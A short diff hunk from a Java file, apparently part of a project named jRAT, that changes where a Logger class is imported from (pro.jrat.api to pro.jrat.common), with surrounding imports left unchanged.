@@ -14,13 +14,13 @@ import java.util.List;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipFile;
 
-import pro.jrat.api.Logger;
 import pro.jrat.client.Constants;
 import pro.jrat.client.Main;
 import pro.jrat.client.UniqueId;
 import pro.jrat.client.exceptions.MissingKeyException;
 import pro.jrat.client.listeners.ExtensionInstallerListener;
 import pro.jrat.client.net.WebRequest;
+import pro.jrat.common.Logger;
 import pro.jrat.common.codec.Hex;
 import pro.jrat.common.listeners.CopyStreamsListener;
 import pro.jrat.common.utils.IOUtils;
